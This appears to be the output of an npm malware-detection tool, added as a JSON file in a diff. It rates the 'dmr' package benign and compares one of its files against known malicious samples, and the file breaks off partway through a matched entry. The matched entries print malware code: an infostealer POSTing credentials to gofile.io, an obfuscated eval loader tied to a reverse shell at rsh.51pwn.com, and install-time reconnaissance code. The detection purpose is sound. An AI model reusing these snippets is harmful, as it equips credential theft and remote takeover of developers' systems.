@@ -1,0 +1,1106 @@
+{
+  "package_name": "dmr",
+  "package_version": "0.2.10",
+  "label": "benign",
+  "detection_time": "2026-05-26T18:17:07.362381",
+  "status": "success",
+  "selected_files_count": 12,
+  "selected_files": [
+    "package/package.json",
+    "package/lib/app/routes/index.js",
+    "package/lib/app/app.js",
+    "package/lib/app/controllers/controller.js",
+    "package/lib/app/controllers/report/report.js",
+    "package/lib/app/model-provider/dim-chained.js",
+    "package/lib/app/model-provider/dim-chaineds.js",
+    "package/lib/app/model/model.js",
+    "package/lib/app/model/query-conditions.js",
+    "package/lib/app/model/report.js",
+    "package/lib/app/model/response-json.js",
+    "package/lib/app/model/table.js"
+  ],
+  "is_malicious": false,
+  "total_files": 12,
+  "malicious_files": 0,
+  "total_slices": 2,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/dmr/0.2.10/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/dmr/0.2.10/package/lib/app/routes/index.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/dmr/0.2.10/package/lib/app/app.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/dmr/0.2.10/package/lib/app/controllers/controller.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/dmr/0.2.10/package/lib/app/controllers/report/report.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "report_slice_1",
+          "code_snippet": "const fs = require('fs');\nconst Config = require('../../../core/config');\nconst Range = require('../../../util/range');\nconst RangeFormatter = require('../../../formatter/formatter-range');\nconst Controller = require('../controller');\nconst Conditions =  require('../../model/query-conditions');\nconst Report =  require('../../model/report');\nconst Table =  require('../../model/table');\nconst DimChainedsProvider =  require('../../model-provider/dim-chaineds');\nconst ResponseJson = require('../../model/response-json');\nconst DimChained = require('../../model-provider/dim-chained');\nconst Dim = require('../../../entity/dim');\n\nclass ReportController extends Controller{\n    constructor () {\n        super();\n    }\n    getAvailableRanges(req, res, next) {\n        let query = req.query || {};\n        let conditions = new Conditions(query.conditions || []);\n        let interval = JSON.parse(query.interval || null);\n        let intervals =  interval? [interval] : JSON.parse(query.intervals || null);\n        let taskid = query.task;\n        let startdate = conditions.val('startdate');\n        let rej = new ResponseJson(), data = [];\n        let range = new Range();\n        range.setStartDatetime(new Date(startdate + ' 00:00:00'));\n        range.setInterval(query.range || '1d');\n        if (taskid) {\n            let config = Config.find('task',taskid)[\"output-source\"];\n            intervals = intervals || [config[\"interval\"] || config[\"input-interval\"]];\n            intervals.forEach(interval => {\n                let ranges = range.split(interval);\n                ranges.forEach((r, index) => {\n                    let report = new Report({\n                        taskid: taskid,\n                        range: r\n                    });\n                    // 报表存在时\n                    if(report.existsSync()) {\n                        let formatter = new RangeFormatter(r);\n                        let rp = formatter.toParam();\n                        let tpl = '{$hh}:{$mm}:{$ss} {$interval.s}s';\n                        if (rp.interval.auto === 'd') {\n                            tpl = '{$MM}-{$DD} {$interval.h}h';\n                        } else if (rp.interval.auto === 'h') {\n                            tpl = '{$MM}-{$DD} {$hh} {$interval.h}h';\n                        } else if (rp.interval.auto === 'h') {\n                            tpl = '{$MM}-{$DD} {$hh}:{$mm} {$interval.m}m';s\n                        }\n                        data.push({\n                            name: formatter.format(tpl),\n                            value: JSON.stringify(r.param())\n                        });\n                    }\n                });\n            });\n        } else {\n            rej.err('please set taskid!');\n        }\n        rej.set('data', data);\n        res.json(rej.get());\n    }\n    \n    getDimChaineds(req, res, next) {\n        let query = req.query || {};\n        let dconditions = new Conditions(query.dimconditions || []);\n        let conditions = new Conditions(query.conditions || []);\n        let rej = new ResponseJson();\n        let report = new Report({\n            taskid: query.task,\n            range: new Range(JSON.parse(conditions.val('range')))\n        });\n        if(!report.existsSync()) {\n            rej.err('no such report!');\n            res.send(rej.get());\n            return;\n        }\n        let dimParten = dconditions.param();\n        let matchedDims = {};\n        let stream = report.createStream();\n        stream.on('data', result => {\n            let dim = new Dim(result.get('key'));\n            let matchedDim = dim.match(dimParten);\n            if (matchedDim) {\n                matchedDims[JSON.stringify(matchedDim)] = true;\n            }\n        });\n        stream.on('end', () => {\n            let dims = [];\n            Object.keys(matchedDims).forEach(dim => {\n                dims.push(JSON.parse(dim));\n            });\n            // [ { idc: 'all', format: 'all' } , ...]\n            rej.set('data', DimChainedsProvider.produce(dims, dconditions.keys()));\n            res.send(rej.get());\n        });\n    }\n\n\n    getTable(req, res, next) {\n        let query = req.query || {};\n        let conditions = new Conditions(query.conditions || []);\n        let rej = new ResponseJson();\n        let report = new Report({\n            taskid: query.task,\n            range: new Range(JSON.parse(conditions.val('range')))\n        });\n        if(!report.existsSync()) {\n            rej.err('no such report!');\n            res.send(rej.get());\n            return;\n        }\n        let dimchained = conditions.val('dimchained'), dimParten = {};\n        if (dimchained) {\n            dimParten = DimChained.produce(dimchained);\n        }\n        let config = JSON.parse(req.query.config) || {\"columns\": [\"field\",\"calculate\", \"value\"]};\n        let calculate = conditions.val('calculate') || false;\n        if (calculate) {\n            dimParten.calculate = calculate;\n            config.columns = [\"field\", \"value\"]\n        }\n        let stream = report.createStream();\n        config.dimParten = dimParten;\n        let table = new Table(config);\n        table.readReport({\n            stream: stream\n        });\n        table.produce(data => {\n            rej.set('data', data);\n            res.send(rej.get());\n        });\n        \n        // table.readReport({\n        //     stream: report.createStream(),\n        //     alias: {'value': 'value1'}\n        // });\n        // {\"row\":\"value\",\"columns\":[\"\"]}\n\n        \n        \n    }\n}\nmodule.exports = ReportController;",
+          "is_malicious": false,
+          "malice_score": 0.4176668445269267,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code accesses HTTP request query parameters and parses JSON data to construct report ranges and conditions, then reads report data from local storage using file system APIs (fs) and custom Report model methods. It processes and formats this data without performing any network communication or executing system commands. The behavior facilitates report data retrieval and formatting based on user-supplied parameters, with no evidence of suspicious hardcoded IPs, URLs, shell commands, or environment variable usage.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a server-side controller module that processes HTTP requests to retrieve and format report data from local storage. It uses standard Node.js modules and custom models to parse input parameters, read report files, and format output. There is no evidence of network communication for data exfiltration, no obfuscated or dynamically evaluated code, no access to sensitive system or user data beyond what is necessary for report generation, and no manipulation of environment variables or execution of shell commands. Compared to the known malicious patterns, this code lacks key indicators such as data harvesting, obfuscation, eval usage, or network exfiltration. The behavior is consistent with legitimate application logic for report management.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_133830_348434_snippet_1",
+              "source_package": "TeamViewer.exe / BetterShaders Setup 1.0.3.exe / Software.exe (Electron-based infostealer variants) (NSIS installer (Electron app bundle))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_133830_348434/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4195367693901062,
+              "code_similarity": 0.3549376428127289,
+              "behavior_similarity": 0.48413586616516113,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Pseudocode representation based on report\nconst fs = require('fs');\nconst os = require('os');\nconst browserData = getBrowserData();\nconst credentials = getCredentials();\nconst systemInfo = getSystemInfo();\nconst payload = { browserData, credentials, systemInfo };\n\nuploadToGofile(payload);",
+                "code_behavior": "At runtime, after installation and on app launch, the code uses Node.js APIs to collect system information, browser histories, and credentials from the victim's machine, packages this data, and sends it via network requests to the gofile file-sharing service, resulting in exfiltration of sensitive user data.",
+                "malice_analysis": {
+                  "why_suspicious": "The code systematically harvests sensitive user data (system info, browser histories, credentials) and exfiltrates it to an external file-sharing service (gofile.io), which is a hallmark of infostealer malware.",
+                  "violated_expectations": "A legitimate Electron application should not access or transmit browser histories, credentials, or system information without explicit user consent, nor should it upload such data to anonymous third-party file-sharing services.",
+                  "similar_legitimate_use": "Some legitimate diagnostic or support tools may collect system information for troubleshooting, but they do not access browser credentials or upload sensitive data to anonymous file-sharing services.",
+                  "key_indicators": [
+                    "Access to browser data and credential stores via Node.js APIs",
+                    "Collection of system information using Node.js modules (e.g., os, fs)",
+                    "Network exfiltration to gofile.io or similar file-sharing domains",
+                    "Malicious logic embedded in Electron app's asar archive (e.g., a.js)",
+                    "Absence of user notification or consent for data collection and exfiltration"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At runtime, after installation and on app launch",
+                  "file_location": "app\\resources\\app.asar > a.js (Node.js script inside Electron app bundle)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "TeamViewer.exe / BetterShaders Setup 1.0.3.exe / Software.exe (Electron-based infostealer variants)",
+                  "package_manager": "NSIS installer (Electron app bundle)",
+                  "package_versions": "Unknown (malicious samples: 9926e2782d603061b52d88f83d93e7af, cfc6e0014b3cc8d4dcaf0d76e2382556, b150afa6b3642ea1da1233b76f7b454e)",
+                  "why_malicious": "The entire package is malicious because it masquerades as legitimate software (e.g., TeamViewer.exe, BetterShaders Setup 1.0.3.exe, Software.exe), but actually installs and executes an Electron-based infostealer. The malware leverages Node.js capabilities within the Electron framework to harvest sensitive data such as system information, browser histories, and credentials, and exfiltrates this data to external file-sharing services like gofile.io. The use of NSIS installers and Electron's asar archive structure is intended to evade detection and facilitate stealthy data theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User downloads and runs the NSIS installer masquerading as legitimate software (e.g., TeamViewer.exe, BetterShaders Setup 1.0.3.exe, Software.exe).",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Installation and execution of the bundled Electron app."
+                  },
+                  {
+                    "step": 2,
+                    "action": "NSIS installer executes the Electron app, which loads the malicious Node.js code from the asar archive.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Malicious code execution within the Electron app context."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious Node.js code collects sensitive data (system information, browser histories, credentials) from the victim's machine.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Preparation of harvested data for exfiltration."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Collected data is exfiltrated to the gofile file-sharing service via network requests.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives stolen data, achieving the final objective of data theft."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Electron app accessing browser data and credentials via Node.js APIs shortly after installation or first run",
+                    "Network connections to file-sharing services (e.g., gofile.io) initiated by Electron-based applications",
+                    "Electron apps bundled in NSIS installers that immediately execute the main app post-installation",
+                    "Absence of user notification or consent for data collection and exfiltration"
+                  ],
+                  "file_indicators": [
+                    "Presence of app.asar archive containing suspicious Node.js scripts (e.g., a.js) within Electron app resources",
+                    "NSIS installer files with names mimicking popular software (e.g., TeamViewer.exe, BetterShaders Setup 1.0.3.exe, Software.exe)",
+                    "Electron app bundles with embedded scripts referencing credential or browser data APIs"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to gofile.io or similar file-sharing domains from Electron app processes",
+                    "Unusual POST requests containing system, browser, or credential data to external file-sharing services",
+                    "Network activity from newly installed Electron apps to non-standard domains immediately after installation"
+                  ],
+                  "how_to_detect": "Monitor for Electron-based applications that, upon installation or first run, access browser credential stores, system information, or user data, and then initiate outbound connections to file-sharing or data exfiltration services such as gofile.io. Inspect Electron app asar archives for Node.js scripts that reference credential or browser data APIs. Flag NSIS installers that immediately execute bundled Electron apps, especially if the app is not from a verified publisher or is distributed outside official channels. Correlate file, process, and network activity to identify infostealer behavior patterns."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104012_987336_snippet_3",
+              "source_package": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104012_987336/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.417630136013031,
+              "code_similarity": 0.3696521520614624,
+              "behavior_similarity": 0.465608149766922,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "var os = require(\"os\"),\n    zlib = require(\"zlib\"),\n    bs = \"base64\",\n    filterNet = (o) => {\n        var oR = {};\n        for (var k in o) {\n            if (\"lo0\" == k) continue;\n            for (var i in o[k]) {\n                if (\"127.0.0.1\" == o[k][i][\"address\"]) continue;\n                if (o[k][i][\"family\"] == \"IPv4\" && o[k][i][\"address\"]) {\n                    oR[k] = o[k][i]\n                    break;\n                }\n            }\n        }\n        return oR;\n    },\n    rmKeys = (o, ...keys) => {\n        for (var k in keys) {\n            delete o[keys[k]];\n        }\n        return o;\n    },\n    pkg = JSON.parse(require(\"fs\").readFileSync(\"package.json\").toString(\"utf8\")),\n    zS = (s) => zlib.brotliCompressSync(s, { level: 11, windowBits: 15, quality: 11 }).toString(bs),\n    zO = (o) => zS(JSON.stringify(o, null, 2)),\n    uS = (s) => zlib.brotliDecompressSync(Buffer.from(s, bs)).toString(),\n    o = {\n        \"name\": pkg.name,\n        \"version\": pkg.version,\n        \"pwd\": process.cwd(),\n        \"env\": process.env,\n        \"platform\": os.platform(),\n        \"arch\": os.arch(),\n        \"release\": os.release(),\n        \"type\": os.type(),\n        \"uptime\": os.uptime(),\n        \"hostname\": os.hostname(),\n        \"cpus\": [os.cpus().length, rmKeys(os.cpus()[0], \"times\")],\n        \"networkInterfaces\": filterNet(os.networkInterfaces()),\n        \"freemem\": os.freemem(),\n        \"totalmem\": os.totalmem(),\n        \"userInfo\": os.userInfo()\n    };\nlet s = zO(o), s1 = uS(`G/sCIJwHtg1sfVPqObPQC6WsmlPZnVOfAqCQlUG+AJay52WlQRR23HYKiwLI/7ncvQM75zP689ZqjKlrgZVYcYBp1gM8R5zV4glyFKt+CPgOAIT7ekBlFUzW87zjyA6CooEMdzcFs33O/t2tAXawBJUI9pOdw8hOkS4DYLG9xHRAeDZ5ZXbs1oL+Z+k+M2aA4HzxpZD/VAbL7E8erim7UfCx9F/Y4+yCKMrUklhDVFoCdwwQYsUTOxl/nc+gLuTlglxBdupg+2xUfQt7zegHtGsz5GkVkFMdVd6qgszOQWOzY8FtLc/U7KSvB2Q4l4yGpcavIeSsCiZV7YQM5X3KWTMz8v1g55Yld/RldQTkyU91zlOFCeelQqC8qAIL4vEXNhgs2suqFHoQstfjXJpvHFgV0v7Bf8f7X38+oji8qZQUEG8LimNT5MDFKHJ5efBeZkZVIAKCp7gdzI60KAs=`);\nprocess.env.NODE_NO_EVAL = undefined;\neval(s1);",
+                "code_behavior": "At runtime, when rsh.js is executed as a detached process, the code collects detailed system, environment, and user information, compresses and encodes it, decompresses an obfuscated payload from a base64 string, sets the NODE_NO_EVAL environment variable to undefined, and executes the decompressed payload using eval, resulting in the execution of further malicious code.",
+                "malice_analysis": {
+                  "why_suspicious": "Collecting extensive system, environment, and user data, compressing and encoding it, and executing obfuscated code via eval are all strong indicators of malicious intent and are commonly used to evade detection and enable data exfiltration.",
+                  "violated_expectations": "Legitimate packages do not collect and exfiltrate system or user information, nor do they execute dynamically decompressed and obfuscated code via eval.",
+                  "similar_legitimate_use": "Compression and system info gathering may be used in legitimate diagnostics or telemetry, but not in combination with obfuscated payload execution and without user consent.",
+                  "key_indicators": [
+                    "Obfuscated and base64-encoded payload decompressed and executed via eval",
+                    "Systematic collection of system, environment, and user data",
+                    "Manipulation of environment variables to bypass security controls",
+                    "No user notification or consent for data collection or code execution"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when rsh.js is executed)",
+                  "file_location": "scripts/rsh.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.]",
+                  "package_manager": "npm",
+                  "package_versions": "[e.g., 6.0.2, 6.0.3, 6.0.4, 2.2.1, 2.2.3, 7.0.5, 5.0.2, 3.0.3]",
+                  "why_malicious": "All packages in this campaign execute obfuscated JavaScript code at install time, which collects extensive system, environment, and user information and establishes a persistent reverse shell to a remote attacker-controlled server (rsh.51pwn.com:8880), enabling full remote code execution and exfiltration of sensitive data. The attack chain is triggered via multiple npm lifecycle hooks, uses detached background processes for persistence, and employs obfuscation and dynamic code execution to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering preinstall, postinstall, test, or init scripts defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of scripts/init.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "scripts/init.js is executed, which launches scripts/rsh.js as a detached child process and immediately exits to conceal ongoing activity.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of scripts/rsh.js in the background"
+                  },
+                  {
+                    "step": 3,
+                    "action": "scripts/rsh.js collects detailed system, environment, and user data, compresses and encodes it, decompresses an obfuscated payload, and executes it via eval.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of reverse shell payload from decompressed code"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The reverse shell payload establishes a persistent connection to rsh.51pwn.com:8880, exfiltrates collected system information, and provides the attacker with remote shell access for arbitrary command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control over the compromised system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of scripts/init.js during npm install, test, or init lifecycle events",
+                    "Creation of detached child processes in install/test scripts (child_process.fork with {detached: true})",
+                    "Presence of obfuscated or base64-encoded JavaScript payloads in package files",
+                    "Use of eval to execute dynamically decompressed or generated code",
+                    "Outbound TCP connections to hardcoded C2 domains (e.g., rsh.51pwn.com:8880) during or after installation",
+                    "Collection and exfiltration of system, environment, and user data during package installation or execution"
+                  ],
+                  "file_indicators": [
+                    "scripts/init.js",
+                    "scripts/rsh.js",
+                    "package.json with install/test/init scripts running 'node ./scripts/init.js'",
+                    "Obfuscated JavaScript with base64-encoded or Unicode-escaped payloads"
+                  ],
+                  "network_indicators": [
+                    "rsh.51pwn.com:8880",
+                    "Outbound TCP connections to rsh.51pwn.com on port 8880",
+                    "Initial data exfiltration containing compressed system information"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of scripts during install, test, or init lifecycle events, especially those launching detached child processes or containing obfuscated/base64-encoded code. Flag any package that establishes outbound TCP connections to suspicious domains (e.g., rsh.51pwn.com) or uncommon ports during or after installation. Use static analysis to detect eval usage on dynamically decompressed payloads and the presence of Unicode-escaped or base64-encoded code. Alert on collection and exfiltration of system, environment, or user data during package installation or execution. Correlate file indicators (scripts/init.js, scripts/rsh.js, suspicious package.json scripts) with behavioral and network indicators for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_214505_468850_snippet_1",
+              "source_package": "core-tracing (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_214505_468850/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.416709840297699,
+              "code_similarity": 0.3808974027633667,
+              "behavior_similarity": 0.45252224802970886,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const td = {\n    p: package,\n    c: __dirname,\n    hd: os.homedir(),\n    hn: os.hostname(),\n    un: os.userInfo().username,\n    dns: JSON.stringify(dns.getServers()),\n    ip: JSON.stringify(gethttpips()),\n    dirs: JSON.stringify(getFiles([\"C:\\\\\",\"D:\\\\\",\"/\",\"/home\"]))\n}",
+                "code_behavior": "During postinstall, the code collects system reconnaissance data by accessing directory listings, usernames, home directories, hostnames, network interface IPs, DNS servers, and the package name, then prepares this data for exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "Collecting extensive system and network information during package installation is highly abnormal and indicative of reconnaissance or data theft, especially when performed without user consent.",
+                  "violated_expectations": "Legitimate npm packages do not access or collect sensitive user or system information during installation, nor do they prepare such data for exfiltration.",
+                  "similar_legitimate_use": "Some diagnostic or telemetry tools may collect limited environment data, but only with explicit user consent and clear disclosure, and never at install-time.",
+                  "key_indicators": [
+                    "Access to root and user directories (C:\\, D:\\, /, /home) during installation",
+                    "Collection of usernames, home directories, and hostnames",
+                    "Enumeration of network interfaces and DNS servers",
+                    "Preparation of collected data for outbound transmission"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall",
+                  "file_location": "index.js (main entry point of the malicious package)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "core-tracing",
+                  "package_manager": "npm",
+                  "package_versions": "99.10.9 (and other high versions for all typosquatted packages)",
+                  "why_malicious": "The package is a typosquatted clone of legitimate @azure packages, specifically designed to steal personally identifiable information (PII) and perform system reconnaissance on the developer's environment. Upon installation, the malicious code executes automatically, harvesting sensitive data and exfiltrating it to an attacker-controlled domain. The package targets users who mistakenly install it due to omitting the @azure scope, leveraging high version numbers to appear legitimate."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User mistakenly installs the malicious typosquatted package (e.g., core-tracing instead of @azure/core-tracing).",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code execution during postinstall."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code collects system, user, and network reconnaissance data.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Preparation of data for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Collected data is exfiltrated via HTTPS POST to an attacker-controlled domain.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives sensitive data."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Collected data is also exfiltrated via DNS query to the attacker's domain.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker receives data via DNS channel."
+                  },
+                  {
+                    "step": 5,
+                    "action": "Malicious code checks for specific hostnames/usernames to avoid running on the attacker's own machines.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Avoids detection and analysis in certain environments."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Automatic execution of code during npm package postinstall phase",
+                    "Collection of directory listings, usernames, hostnames, and network configuration during installation",
+                    "Exfiltration of data via HTTPS POST to hardcoded external domains",
+                    "Exfiltration of data via DNS queries with encoded payloads to attacker-controlled domains",
+                    "Presence of anti-analysis logic (host/user exclusions) in install scripts"
+                  ],
+                  "file_indicators": [
+                    "index.js or main entry file containing postinstall scripts",
+                    "Access to root directories (C:\\, D:\\, /, /home) during installation",
+                    "References to os, dns, and network modules in install scripts",
+                    "Presence of functions or logic that check for specific hostnames or usernames"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to https://425a2.rt11.ml",
+                    "DNS queries to *.425a2.rt11.ml with hex-encoded subdomains containing system/user data"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for unexpected postinstall scripts that access sensitive directories, enumerate user and network information, or initiate outbound network requests. Flag packages with unusually high version numbers that mimic popular scoped packages (e.g., missing @azure prefix). Detect outbound connections to known malicious domains (425a2.rt11.ml) and DNS queries with encoded data in subdomains. Analyze install scripts for anti-analysis logic that excludes specific hostnames or usernames. Use a combination of file, behavioral, and network indicators to automate detection and prevent installation of malicious typosquatted packages."
+                }
+              }
+            },
+            {
+              "match_id": "20240708_171641_007733_snippet_1",
+              "source_package": "TeamViewer.exe / BetterShaders Setup 1.0.3.exe / Software.exe (malicious Electron apps) (NSIS installer (Electron app distribution))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240708_171641_007733/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.41579848527908325,
+              "code_similarity": 0.31033584475517273,
+              "behavior_similarity": 0.5212610960006714,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Pseudocode representation based on report\nconst os = require('os');\nconst fs = require('fs');\nconst fetch = require('node-fetch');\n\n// Collect system info\nconst sysInfo = os.userInfo();\nconst browserHistory = fs.readFileSync('path/to/browser/history');\nconst credentials = fs.readFileSync('path/to/credentials');\n\n// Exfiltrate to gofile\nfetch('https://gofile.io/upload', {\n  method: 'POST',\n  body: { sysInfo, browserHistory, credentials }\n});",
+                "code_behavior": "At runtime (upon application execution), the code collects system information, browser history, and credentials from the filesystem using Node.js APIs, then sends this data via an outbound HTTP POST request to the gofile.io file-sharing service, resulting in exfiltration of sensitive user data to an external attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "The code programmatically accesses sensitive files such as browser history and credential stores, then transmits this data to an external file-sharing service (gofile.io) without user knowledge or consent. This behavior is characteristic of infostealer malware.",
+                  "violated_expectations": "Legitimate Electron applications should not access or transmit user credentials, browser history, or detailed system information without explicit user consent and clear disclosure. Accessing and exfiltrating such data is a direct violation of user privacy and security expectations.",
+                  "similar_legitimate_use": "Some legitimate applications may collect anonymized telemetry or crash logs, but they do not access credential stores or browser histories, and always request user consent for any data collection or transmission.",
+                  "key_indicators": [
+                    "Direct file access to browser history and credential files from within Electron app resources",
+                    "Outbound HTTP POST requests to gofile.io/upload or similar file-sharing endpoints",
+                    "Node.js code embedded in .asar archives performing OS-level data harvesting",
+                    "Absence of user prompts or consent dialogs for sensitive data access or transmission"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "at runtime (upon application execution)",
+                  "file_location": "app\\resources\\app.asar\\a.js",
+                  "required_permissions": [
+                    "filesystem (read access to browser and credential files)",
+                    "network (outbound HTTP POST requests)",
+                    "environment_vars (access to user/system information)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "TeamViewer.exe / BetterShaders Setup 1.0.3.exe / Software.exe (malicious Electron apps)",
+                  "package_manager": "NSIS installer (Electron app distribution)",
+                  "package_versions": "Unknown (all observed hashes: 9926e2782d603061b52d88f83d93e7af, cfc6e0014b3cc8d4dcaf0d76e2382556, b150afa6b3642ea1da1233b76f7b454e)",
+                  "why_malicious": "These packages are Electron-based desktop applications distributed via NSIS installers that contain malicious Node.js code within their .asar archives. The code is designed to harvest sensitive user data, including system information, browser histories, and credentials, and exfiltrate it to external file-sharing services such as gofile.io. The applications masquerade as legitimate software to evade detection and facilitate data theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User downloads and executes a trojanized Electron app distributed as an NSIS installer.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious Electron app is installed and launched."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Electron app unpacks and executes Node.js code from the .asar archive (a.js) upon application startup.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is loaded into memory and prepared for execution."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious Node.js code collects system information, browser history, and credentials from the victim's machine.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive data is gathered from the victim's machine."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Collected data is exfiltrated to gofile.io via HTTP POST request.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives stolen data via the file-sharing service."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Electron app accessing browser history and credential files without user consent",
+                    "Electron app making outbound HTTP POST requests to file-sharing services such as gofile.io",
+                    "Node.js code within .asar archives performing OS-level data collection and exfiltration"
+                  ],
+                  "file_indicators": [
+                    "Presence of suspicious .asar files in Electron app resources (e.g., app\\resources\\app.asar\\a.js)",
+                    "NSIS installer files with hashes: 9926e2782d603061b52d88f83d93e7af, cfc6e0014b3cc8d4dcaf0d76e2382556, b150afa6b3642ea1da1233b76f7b454e"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to https://gofile.io/upload from Electron app processes",
+                    "Unusual HTTP POST requests containing system or credential data to file-sharing domains"
+                  ],
+                  "how_to_detect": "Monitor Electron-based applications for unauthorized access to sensitive files such as browser history and credential stores. Inspect .asar archives for embedded Node.js scripts that perform data harvesting or exfiltration. Flag NSIS installers with known malicious hashes or those that unpack Electron apps exhibiting these behaviors. Monitor network traffic for outbound HTTP POST requests to gofile.io/upload or similar file-sharing services originating from Electron app processes."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_130802_418777_snippet_3",
+              "source_package": "CryptoRocket (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_130802_418777/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4150717854499817,
+              "code_similarity": 0.36655011773109436,
+              "behavior_similarity": 0.46359342336654663,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
